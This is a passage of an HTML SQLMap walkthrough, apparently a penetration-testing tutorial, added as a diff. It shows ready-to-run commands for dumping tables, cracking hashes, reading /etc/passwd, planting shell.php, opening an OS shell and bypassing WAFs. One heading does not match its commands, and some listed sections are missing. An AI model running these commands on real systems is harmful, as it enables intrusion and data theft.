@@ -1,0 +1,2151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap Complete Walkthrough</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 50%, #0d0d0d 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 40px;
+            background: linear-gradient(45deg, #000000, #1a1a1a, #000000);
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            border: 2px solid #333;
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        h1 {
+            font-size: 3.5em;
+            margin-bottom: 15px;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.9);
+            letter-spacing: 4px;
+            background: linear-gradient(45deg, #ffffff, #cccccc, #999999);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            z-index: 1;
+        }
+
+        .subtitle {
+            font-size: 1.3em;
+            color: #aaa;
+            font-weight: 300;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .nav-menu {
+            background: linear-gradient(45deg, #111, #222, #111);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 15px;
+            border: 1px solid #333;
+            box-shadow: inset 0 3px 8px rgba(0,0,0,0.5);
+        }
+
+        .nav-menu ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .nav-menu a {
+            color: #ccc;
+            text-decoration: none;
+            padding: 12px 20px;
+            border: 1px solid #444;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
+            text-transform: uppercase;
+            font-size: 0.9em;
+            letter-spacing: 1px;
+        }
+
+        .nav-menu a:hover {
+            background: linear-gradient(45deg, #333, #444);
+            color: #fff;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.4);
+            border-color: #555;
+        }
+
+        .section {
+            margin: 50px 0;
+            background: linear-gradient(135deg, #1a1a1a, #252525, #1a1a1a);
+            padding: 35px;
+            border-radius: 15px;
+            border: 1px solid #333;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+            position: relative;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #444, transparent);
+        }
+
+        h2 {
+            color: #fff;
+            margin-bottom: 25px;
+            font-size: 2.2em;
+            border-bottom: 3px solid #444;
+            padding-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h3 {
+            color: #ddd;
+            margin: 30px 0 20px 0;
+            font-size: 1.5em;
+            border-left: 5px solid #666;
+            padding-left: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        h4 {
+            color: #ccc;
+            margin: 20px 0 15px 0;
+            font-size: 1.2em;
+            border-left: 3px solid #555;
+            padding-left: 15px;
+        }
+
+        .code-block {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+            border: 2px solid #333;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            box-shadow: inset 0 3px 8px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .code-block::before {
+            content: '●●●';
+            position: absolute;
+            top: 10px;
+            left: 15px;
+            color: #666;
+            font-size: 1.2em;
+        }
+
+        .code-block pre {
+            margin: 0;
+            color: #00ff41;
+            text-shadow: 0 0 8px rgba(0,255,65,0.3);
+            padding-top: 20px;
+        }
+
+        .command {
+            color: #00ffff;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(0,255,255,0.3);
+        }
+
+        .output {
+            color: #ffff00;
+            margin-top: 15px;
+            text-shadow: 0 0 5px rgba(255,255,0,0.2);
+        }
+
+        .comment {
+            color: #888;
+            font-style: italic;
+        }
+
+        .warning {
+            background: linear-gradient(135deg, #2a1a1a, #3a1a1a);
+            border-left: 5px solid #ff4444;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(255,68,68,0.1);
+        }
+
+        .info {
+            background: linear-gradient(135deg, #1a1a2a, #1a1a3a);
+            border-left: 5px solid #4444ff;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(68,68,255,0.1);
+        }
+
+        .success {
+            background: linear-gradient(135deg, #1a2a1a, #1a3a1a);
+            border-left: 5px solid #44ff44;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(68,255,68,0.1);
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+
+        .feature-card {
+            background: linear-gradient(135deg, #1e1e1e, #2a2a2a);
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #444, #666, #444);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 30px rgba(0,0,0,0.5);
+            border-color: #555;
+        }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            background: linear-gradient(135deg, #1a1a1a, #1e1e1e);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+
+        .option-table th,
+        .option-table td {
+            border: 1px solid #333;
+            padding: 15px;
+            text-align: left;
+        }
+
+        .option-table th {
+            background: linear-gradient(135deg, #2a2a2a, #333);
+            color: #fff;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .option-table tr:nth-child(even) {
+            background: rgba(255,255,255,0.02);
+        }
+
+        .option-table tr:hover {
+            background: rgba(255,255,255,0.05);
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 25px;
+            background: linear-gradient(45deg, #333, #444);
+            color: #fff;
+            text-decoration: none;
+            border-radius: 8px;
+            border: 1px solid #555;
+            transition: all 0.3s ease;
+            margin: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.9em;
+        }
+
+        .btn:hover {
+            background: linear-gradient(45deg, #444, #555);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+
+        .terminal {
+            background: linear-gradient(135deg, #000, #111);
+            color: #00ff41;
+            padding: 25px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            margin: 20px 0;
+            border: 2px solid #333;
+            box-shadow: 0 0 30px rgba(0,255,65,0.1);
+            position: relative;
+        }
+
+        .terminal::before {
+            content: "root@kali:~# ";
+            color: #ff0080;
+            font-weight: bold;
+            text-shadow: 0 0 5px rgba(255,0,128,0.3);
+        }
+
+        .terminal-window {
+            background: #000;
+            border-radius: 10px;
+            padding: 0;
+            margin: 20px 0;
+            border: 2px solid #333;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            background: linear-gradient(135deg, #333, #222);
+            padding: 10px 15px;
+            border-bottom: 1px solid #444;
+            display: flex;
+            align-items: center;
+        }
+
+        .terminal-buttons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .terminal-button {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .close { background: #ff5f57; }
+        .minimize { background: #ffbd2e; }
+        .maximize { background: #28ca42; }
+
+        .terminal-content {
+            padding: 20px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2.5em;
+            }
+            
+            .nav-menu ul {
+                flex-direction: column;
+            }
+            
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .section {
+                padding: 25px;
+            }
+        }
+
+        .scroll-top {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: linear-gradient(45deg, #333, #555);
+            color: #fff;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            cursor: pointer;
+            display: none;
+            z-index: 1000;
+            font-size: 1.5em;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+        }
+
+        .scroll-top:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+        }
+
+        .toc {
+            background: linear-gradient(135deg, #1a1a1a, #1e1e1e);
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid #333;
+            margin: 25px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+        }
+
+        .toc h3 {
+            border-left: 4px solid #666;
+            margin-bottom: 20px;
+        }
+
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .toc li {
+            padding: 8px 0;
+            border-bottom: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .toc li:hover {
+            padding-left: 10px;
+            border-left: 3px solid #666;
+        }
+
+        .toc a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .toc a:hover {
+            color: #fff;
+        }
+
+        .attack-vector {
+            background: linear-gradient(135deg, #1a1a2a, #2a1a1a);
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .payload-example {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            color: #ff6b6b;
+            text-shadow: 0 0 3px rgba(255,107,107,0.2);
+        }
+
+        .technique-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #333, #555);
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            margin: 3px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .risk-high { border-left-color: #ff4444; }
+        .risk-medium { border-left-color: #ffaa00; }
+        .risk-low { border-left-color: #44ff44; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>SQLMap</h1>
+            <p class="subtitle">Advanced SQL Injection Testing Framework</p>
+        </header>
+
+        <div class="toc">
+            <h3>Table of Contents</h3>
+            <ul>
+                <li><a href="#introduction">Introduction</a></li>
+                <li><a href="#installation">Installation</a></li>
+                <li><a href="#basic-usage">Basic Usage</a></li>
+                <li><a href="#detection-techniques">Detection Techniques</a></li>
+                <li><a href="#exploitation-methods">Exploitation Methods</a></li>
+                <li><a href="#database-enumeration">Database Enumeration</a></li>
+                <li><a href="#advanced-features">Advanced Features</a></li>
+                <li><a href="#evasion-techniques">Evasion Techniques</a></li>
+                <li><a href="#automation">Automation & Scripting</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                <li><a href="#troubleshooting">Troubleshooting</a></li>
+                <li><a href="#best-practices">Best Practices</a></li>
+            </ul>
+        </div>
+
+        <section id="introduction" class="section">
+            <h2>Introduction to SQLMap</h2>
+            <p>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It's considered the de facto standard for SQL injection testing worldwide.</p>
+            
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h3>Automatic Detection</h3>
+                    <p>Identifies SQL injection vulnerabilities across multiple database types with intelligent fingerprinting.</p>
+                    <div class="technique-badge">Time-based</div>
+                    <div class="technique-badge">Boolean-based</div>
+                    <div class="technique-badge">Error-based</div>
+                </div>
+                <div class="feature-card">
+                    <h3>Database Support</h3>
+                    <p>Supports 20+ database management systems including MySQL, PostgreSQL, Oracle, MSSQL, and SQLite.</p>
+                    <div class="technique-badge">MySQL</div>
+                    <div class="technique-badge">PostgreSQL</div>
+                    <div class="technique-badge">MSSQL</div>
+                </div>
+                <div class="feature-card">
+                    <h3>Advanced Features</h3>
+                    <p>File system access, OS command execution, Windows registry manipulation, and more.</p>
+                    <div class="technique-badge">File Upload</div>
+                    <div class="technique-badge">OS Shell</div>
+                    <div class="technique-badge">Registry</div>
+                </div>
+                <div class="feature-card">
+                    <h3>Evasion Techniques</h3>
+                    <p>Built-in tamper scripts to bypass WAFs, IDS/IPS, and other security mechanisms.</p>
+                    <div class="technique-badge">WAF Bypass</div>
+                    <div class="technique-badge">Encoding</div>
+                    <div class="technique-badge">Obfuscation</div>
+                </div>
+            </div>
+
+            <div class="warning risk-high">
+                <strong>⚠️ Legal Warning:</strong> SQLMap is a powerful penetration testing tool. Only use it on systems you own or have explicit written permission to test. Unauthorized use may violate laws and result in serious legal consequences.
+            </div>
+        </section>
+
+        <section id="installation" class="section">
+            <h2>Installation Guide</h2>
+
+            <h3>System Requirements</h3>
+            <ul style="margin-left: 20px; color: #ccc;">
+                <li>Python 3.6+ (recommended 3.8+)</li>
+                <li>Internet connection for updates</li>
+                <li>Administrative privileges for some features</li>
+            </ul>
+
+            <h3>Installation Methods</h3>
+
+            <h4>Method 1: Git Installation (Recommended)</h4>
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-buttons">
+                        <div class="terminal-button close"></div>
+                        <div class="terminal-button minimize"></div>
+                        <div class="terminal-button maximize"></div>
+                    </div>
+                    <span style="color: #ccc; margin-left: 10px;">Terminal - SQLMap Installation</span>
+                </div>
+                <div class="terminal-content">
+                    <div><span style="color: #ff0080;">root@kali</span><span style="color: #00ff41;">:~#</span> git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</div>
+                    <div><span style="color: #ff0080;">root@kali</span><span style="color: #00ff41;">:~#</span> cd sqlmap-dev</div>
+                    <div><span style="color: #ff0080;">root@kali</span><span style="color: #00ff41;">:~#</span> python sqlmap.py --version</div>
+                    <div style="color: #ffff00; margin-top: 10px;">sqlmap/1.7.12#stable</div>
+                </div>
+            </div>
+
+            <h4>Method 2: Package Installation</h4>
+            <div class="code-block">
+                <pre><span class="command"># Conservative scan (default)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --level=1 --risk=1</span>
+
+<span class="command"># Moderate scan (recommended)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --level=3 --risk=2</span>
+
+<span class="command"># Aggressive scan (use with caution)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --level=5 --risk=3</span>
+
+<span class="command"># Custom detection</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --level=4 --risk=2 --technique=BEUST</span></pre>
+            </div>
+
+            <h3>Parameter Testing</h3>
+            <div class="attack-vector risk-medium">
+                <h4>Testing Specific Parameters</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Test specific parameter</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1&cat=news" -p "id"</span>
+
+<span class="command"># Test multiple parameters</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1&cat=news" -p "id,cat"</span>
+
+<span class="command"># Skip specific parameters</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1&cat=news" --skip="cat"</span>
+
+<span class="command"># Test POST parameters</span>
+<span class="command">python sqlmap.py -u "http://target.com/login" --data="user=admin&pass=test" -p "user"</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="exploitation-methods" class="section">
+            <h2>Exploitation Methods</h2>
+
+            <h3>HTTP Request Methods</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>GET Requests</h4>
+                    <div class="code-block">
+                        <pre><span class="command">python sqlmap.py -u "http://target.com/page?id=1"</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>POST Requests</h4>
+                    <div class="code-block">
+                        <pre><span class="command">python sqlmap.py -u "http://target.com/login" \
+  --data "username=admin&password=test"</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>Cookie Testing</h4>
+                    <div class="code-block">
+                        <pre><span class="command">python sqlmap.py -u "http://target.com/page" \
+  --cookie "PHPSESSID=abc123; id=1*"</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>Header Injection</h4>
+                    <div class="code-block">
+                        <pre><span class="command">python sqlmap.py -u "http://target.com/page" \
+  --headers "X-Forwarded-For: 127.0.0.1*"</span></pre>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Request File Testing</h3>
+            <div class="attack-vector risk-high">
+                <h4>Using Saved HTTP Requests</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Capture request with Burp Suite or similar</span>
+<span class="command"># Save to file (e.g., request.txt)</span>
+
+<span class="comment"># Example request file content:</span>
+<span style="color: #ccc;">POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Cookie: PHPSESSID=abc123
+
+username=admin&password=test</span>
+
+<span class="command"># Test the saved request</span>
+<span class="command">python sqlmap.py -r request.txt</span>
+
+<span class="command"># Test specific parameter in request file</span>
+<span class="command">python sqlmap.py -r request.txt -p "username"</span></pre>
+                </div>
+            </div>
+
+            <h3>Advanced Request Handling</h3>
+            <div class="code-block">
+                <pre><span class="command"># Custom User-Agent</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
+
+<span class="command"># Random User-Agent</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --random-agent</span>
+
+<span class="command"># HTTP Authentication</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --auth-type Basic --auth-cred "admin:password"</span>
+
+<span class="command"># Proxy Usage</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --proxy "http://127.0.0.1:8080"</span>
+
+<span class="command"># Ignore HTTP errors</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --ignore-code=404</span></pre>
+            </div>
+
+            <h3>Session Handling</h3>
+            <div class="code-block">
+                <pre><span class="command"># Resume previous session</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --resume</span>
+
+<span class="command"># Custom session file</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --session-file="/tmp/session.sqlite"</span>
+
+<span class="command"># Flush session</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --flush-session</span></pre>
+            </div>
+        </section>
+
+        <section id="database-enumeration" class="section">
+            <h2>Database Enumeration</h2>
+
+            <h3>Information Gathering Workflow</h3>
+            <div class="attack-vector risk-medium">
+                <h4>Step-by-Step Enumeration</h4>
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button close"></div>
+                            <div class="terminal-button minimize"></div>
+                            <div class="terminal-button maximize"></div>
+                        </div>
+                        <span style="color: #ccc; margin-left: 10px;">SQLMap Enumeration Sequence</span>
+                    </div>
+                    <div class="terminal-content">
+                        <div><span style="color: #00ffff;"># Step 1: Basic Info</span></div>
+                        <div>python sqlmap.py -u "http://target.com/page?id=1" --banner --current-user --current-db</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># Step 2: List Databases</span></div>
+                        <div>python sqlmap.py -u "http://target.com/page?id=1" --dbs</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># Step 3: List Tables</span></div>
+                        <div>python sqlmap.py -u "http://target.com/page?id=1" -D database_name --tables</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># Step 4: List Columns</span></div>
+                        <div>python sqlmap.py -u "http://target.com/page?id=1" -D database_name -T table_name --columns</div>
+                        <br>
+                        <div><span style="color: #00ffff;"># Step 5: Dump Data</span></div>
+                        <div>python sqlmap.py -u "http://target.com/page?id=1" -D database_name -T table_name --dump</div>
+                    </div>
+                </div>
+            </div>
+
+            <h3>Database Information Commands</h3>
+            <table class="option-table">
+                <thead>
+                    <tr>
+                        <th>Command</th>
+                        <th>Description</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>--banner</td>
+                        <td>Database version banner</td>
+                        <td>--banner</td>
+                    </tr>
+                    <tr>
+                        <td>--current-user</td>
+                        <td>Current database user</td>
+                        <td>--current-user</td>
+                    </tr>
+                    <tr>
+                        <td>--current-db</td>
+                        <td>Current database name</td>
+                        <td>--current-db</td>
+                    </tr>
+                    <tr>
+                        <td>--hostname</td>
+                        <td>Database server hostname</td>
+                        <td>--hostname</td>
+                    </tr>
+                    <tr>
+                        <td>--is-dba</td>
+                        <td>Check if user is DBA</td>
+                        <td>--is-dba</td>
+                    </tr>
+                    <tr>
+                        <td>--users</td>
+                        <td>Enumerate all users</td>
+                        <td>--users</td>
+                    </tr>
+                    <tr>
+                        <td>--passwords</td>
+                        <td>Enumerate user passwords</td>
+                        <td>--passwords</td>
+                    </tr>
+                    <tr>
+                        <td>--privileges</td>
+                        <td>Enumerate user privileges</td>
+                        <td>--privileges</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Database Structure Enumeration</h3>
+            <div class="code-block">
+                <pre><span class="command"># List all databases</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --dbs</span>
+
+<span class="command"># List tables in specific database</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" --tables</span>
+
+<span class="command"># List columns in specific table</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --columns</span>
+
+<span class="command"># Get table schema</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --schema</span>
+
+<span class="command"># Count table entries</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --count</span></pre>
+            </div>
+
+            <h3>Data Extraction</h3>
+            <div class="attack-vector risk-high">
+                <h4>Dump Strategies</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Dump entire table</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" --dump</span>
+
+<span class="command"># Dump specific columns</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  -C "username,password" --dump</span>
+
+<span class="command"># Dump with conditions</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  --dump --where "id>1 AND role='admin'"</span>
+
+<span class="command"># Dump first/last entries</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  --dump --start=1 --stop=10</span>
+
+<span class="command"># Dump all databases (dangerous)</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --dump-all --exclude-sysdbs</span></pre>
+                </div>
+            </div>
+
+            <h3>Password Hash Analysis</h3>
+            <div class="code-block">
+                <pre><span class="command"># Identify hash formats</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  -C "password" --dump --identify-hash</span>
+
+<span class="command"># Crack password hashes</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  -C "password" --dump --crack --wordlist=/usr/share/wordlists/rockyou.txt</span>
+
+<span class="command"># Custom cracking options</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" -D "testdb" -T "users" \
+  -C "password" --dump --crack --hash-format=MD5 --attack-method=dictionary</span></pre>
+            </div>
+
+            <div class="info">
+                <strong>ℹ️ Hash Cracking:</strong> SQLMap can automatically identify common hash formats (MD5, SHA1, SHA256) and attempt to crack them using dictionary attacks with popular wordlists.
+            </div>
+        </section>
+
+        <section id="advanced-features" class="section">
+            <h2>Advanced Features</h2>
+
+            <h3>File System Operations</h3>
+            <div class="attack-vector risk-high">
+                <h4>File System Access</h4>
+                <div class="code-block">
+                    <pre><span class="command"># Read system files</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --file-read="/etc/passwd"</span>
+
+<span class="command"># Write files to system</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --file-write="shell.php" --file-dest="/var/www/html/shell.php"</span>
+
+<span class="command"># Upload binary files</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --file-write="payload.exe" --file-dest="C:\\temp\\payload.exe"</span>
+
+<span class="comment"># Common target files</span>
+<span class="command"># Linux: /etc/passwd, /etc/shadow, /var/log/apache2/access.log</span>
+<span class="command"># Windows: C:\\Windows\\System32\\config\\SAM, C:\\boot.ini</span>
+<span class="command"># Web: ../../../etc/passwd, config.php, wp-config.php</span></pre>
+                </div>
+            </div>
+
+            <h3>Operating System Shell Access</h3>
+            <div class="attack-vector risk-high">
+                <h4>Command Execution</h4>
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button close"></div>
+                            <div class="terminal-button minimize"></div>
+                            <div class="terminal-button maximize"></div>
+                        </div>
+                        <span style="color: #ccc; margin-left: 10px;">OS Shell Access</span>
+                    </div>
+                    <div class="terminal-content">
+                        <div><span style="color: #ff0080;">root@kali</span><span style="color: #00ff41;">:~#</span> python sqlmap.py -u "http://target.com/page?id=1" --os-shell</div>
+                        <div style="color: #ffff00; margin-top: 5px;">[INFO] testing if the target URL content is stable</div>
+                        <div style="color: #ffff00;">[INFO] target URL content is stable</div>
+                        <div style="color: #ffff00;">[INFO] fingerprinting the back-end DBMS operating system</div>
+                        <div style="color: #ffff00;">[INFO] the back-end DBMS operating system is Linux</div>
+                        <div style="color: #ffff00;">[INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method</div>
+                        <div style="color: #00ff41; margin-top: 10px;">os-shell> whoami</div>
+                        <div style="color: #ccc;">www-data</div>
+                        <div style="color: #00ff41;">os-shell> uname -a</div>
+                        <div style="color: #ccc;">Linux target 4.15.0-142-generic #146-Ubuntu SMP x86_64 GNU/Linux</div>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <pre><span class="command"># Get OS shell</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --os-shell</span>
+
+<span class="command"># Execute single OS command</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --os-cmd="whoami"</span>
+
+<span class="command"># PowerShell on Windows</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" --os-pwn</span></pre>
+                </div>
+            </div>
+
+            <h3>Windows Registry Access</h3>
+            <div class="code-block">
+                <pre><span class="command"># Read registry key</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --reg-read --reg-key "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"</span>
+
+<span class="command"># Add registry key</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --reg-add --reg-key "HKLM\\SOFTWARE\\Test" --reg-value "TestKey" --reg-data "TestData"</span>
+
+<span class="command"># Delete registry key</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
+  --reg-del --reg-key "HKLM\\SOFTWARE\\Test" --reg-value "TestKey"</span></pre>
+            </div>
+
+            <h3>Database-Specific Features</h3>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h4>MySQL Features</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># UDF injection</span>
+<span class="command">python sqlmap.py -u "target" --udf-inject</span>
+
+<span class="command"># MySQL privilege escalation</span>
+<span class="command">python sqlmap.py -u "target" --priv-esc</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>MSSQL Features</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># xp_cmdshell enable</span>
+<span class="command">python sqlmap.py -u "target" --os-shell</span>
+
+<span class="command"># MSSQL crawling</span>
+<span class="command">python sqlmap.py -u "target" --crawl=2</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>Oracle Features</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Oracle SID enumeration</span>
+<span class="command">python sqlmap.py -u "target" --banner</span>
+
+<span class="command"># Tablespace info</span>
+<span class="command">python sqlmap.py -u "target" --schema</span></pre>
+                    </div>
+                </div>
+                <div class="feature-card">
+                    <h4>PostgreSQL Features</h4>
+                    <div class="code-block">
+                        <pre><span class="command"># Copy from/to files</span>
+<span class="command">python sqlmap.py -u "target" --file-read="/etc/passwd"</span>
+
+<span class="command"># Large object support</span>
+<span class="command">python sqlmap.py -u "target" --file-write="shell.php"</span></pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="evasion-techniques" class="section">
+            <h2>Evasion Techniques</h2>
+
+            <h3>WAF Bypass Strategies</h3>
+            <div class="attack-vector risk-high">
+                <h4>Tamper Scripts</h4>
+                <div class="code-block">
+                    <pre><span class="command"># List available tamper scripts</span>
+<span class="command">python sqlmap.py --list-tampers</span>
+
+<span class="command"># Common WAF bypass tampers</span>
+<span class="command">python sqlmap.py -u "http://target.com/page?id=1" \
